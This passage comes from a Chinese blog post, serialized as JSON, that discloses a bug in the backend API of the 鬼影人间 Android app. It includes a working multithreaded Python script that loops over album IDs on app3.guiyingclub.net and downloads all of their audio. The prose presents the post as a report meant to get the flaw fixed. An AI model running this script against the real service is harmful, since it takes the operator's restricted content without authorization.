class=\"number\">10103</span>, <span class=\"number\">10104</span>, <span class=\"number\">10105</span>, <span class=\"number\">10106</span>, <span class=\"number\">10107</span>, <span class=\"number\">10108</span>, <span class=\"number\">10109</span>, <span class=\"number\">10110</span>, <span class=\"number\">10111</span>, <span class=\"number\">10112</span>, <span class=\"number\">10113</span>, <span class=\"number\">10114</span>, <span class=\"number\">10115</span>]</span><br><span class=\"line\">savedPath = <span class=\"string\">'D:\\\\Files\\\\GYRJ\\\\'</span></span><br><span class=\"line\"></span><br><span class=\"line\">executor = ThreadPoolExecutor(max_workers=<span class=\"number\">40</span>)</span><br><span class=\"line\"></span><br><span class=\"line\"><span class=\"function\"><span class=\"keyword\">def</span> <span class=\"title\">download_audio</span><span class=\"params\">(url,path)</span>:</span></span><br><span class=\"line\">    print(<span class=\"string\">'正在下载 %s 到 %s'</span>%(url,path))</span><br><span class=\"line\">    r = requests.get(url, stream=<span class=\"literal\">True</span>)</span><br><span class=\"line\">    f = open(path, <span class=\"string\">\"wb\"</span>)</span><br><span class=\"line\">    <span class=\"keyword\">for</span> chunk <span class=\"keyword\">in</span> r.iter_content(chunk_size=<span class=\"number\">512</span>):</span><br><span class=\"line\">        <span class=\"keyword\">if</span> chunk:</span><br><span class=\"line\">            f.write(chunk)</span><br><span class=\"line\"></span><br><span class=\"line\">currentAlbumName = <span class=\"string\">''</span></span><br><span class=\"line\"><span class=\"keyword\">for</span> i <span class=\"keyword\">in</span> album_ids:</span><br><span class=\"line\">    <span class=\"keyword\">try</span>:</span><br><span class=\"line\">        album_url = <span class=\"string\">'https://app3.guiyingclub.net/api/v3/contents/album/'</span>+str(i)</span><br><span class=\"line\">        resp = requests.get(album_url,headers = headers)</span><br><span class=\"line\">        <span class=\"keyword\">if</span> resp.status_code!=<span class=\"number\">200</span>:</span><br><span class=\"line\">            print(<span class=\"string\">'Got an error : http status code isnot equals 200 , albumid =&gt; %d'</span>%i)</span><br><span class=\"line\">        <span class=\"keyword\">else</span>:</span><br><span class=\"line\">            currentAlbumName = <span class=\"string\">''</span></span><br><span class=\"line\">            <span class=\"keyword\">try</span>:</span><br><span class=\"line\">                album = json.loads(resp.text)[<span class=\"string\">'album'</span>]</span><br><span class=\"line\">                currentAlbumName = album[<span class=\"string\">'name'</span>]</span><br><span class=\"line\">                <span class=\"keyword\">if</span> <span class=\"keyword\">not</span> os.path.exists(album[<span class=\"string\">'name'</span>]):</span><br><span class=\"line\">                    albumSavedDir = savedPath+album[<span class=\"string\">'name'</span>]+<span class=\"string\">'\\\\'</span></span><br><span class=\"line\">                    print(<span class=\"string\">'正在下载专辑 =&gt; %s'</span>%album[<span class=\"string\">'name'</span>])</span><br><span class=\"line\">                    os.mkdir(albumSavedDir)</span><br><span class=\"line\">                    alltask = [executor.submit(download_audio,audio[<span class=\"string\">'url'</span>],albumSavedDir+audio[<span class=\"string\">'name'</span>]+<span class=\"string\">'.mp3'</span>) <span class=\"keyword\">for</span> audio <span class=\"keyword\">in</span> album[<span class=\"string\">'audios'</span>]]</span><br><span class=\"line\">                    <span class=\"keyword\">for</span> future <span class=\"keyword\">in</span> as_completed(alltask):</span><br><span class=\"line\">                        future.result()</span><br><span class=\"line\">                        print(<span class=\"string\">'%s 下载完成'</span>%album[<span class=\"string\">'name'</span>])</span><br><span class=\"line\">            <span class=\"keyword\">except</span>:</span><br><span class=\"line\">                print(<span class=\"string\">'下载专辑 %s 时发生错误，取消 '</span> % currentAlbumName)</span><br><span class=\"line\">    <span class=\"keyword\">except</span>:</span><br><span class=\"line\">        print(<span class=\"string\">'下载专辑 %s 时发生错误，取消 '</span>%currentAlbumName)</span><br></pre></td></tr></table></figure>\n<p>因为仅仅是测试，代码写的比较简陋，我在爬取了几张专辑之后确认这个bug确实能下载所有的音频后结束了脚本的运行，并删除了爬取的数据。（好吧说实话，，，我留了两个龙玲姐姐的。。。如果需要我会立即删除）</p>\n<p>不知道是程序员哥哥工作疏忽还是什么原因，趁没有被坏人利用之前赶紧修复一下，祝鬼影越来越好。。。</p>\n<p>当然，如果诗扬哥要给我个奖励就更好了啊哈哈哈哈哈哈</p>\n<p>因为这个页面并不能保证不被人看到（不过应该没人看。。。因为我的网站中没有任何一个url指向这个页面），所以请收到后尽快回复我删除这个页面。</p>\n","slug":"gyrj","link":"http://lilpig.site/gyrj/","toc":[{"title":"关于鬼影人间Android APP后端接口的一点小问题","id":"关于鬼影人间Android-APP后端接口的一点小问题","index":"1"}]}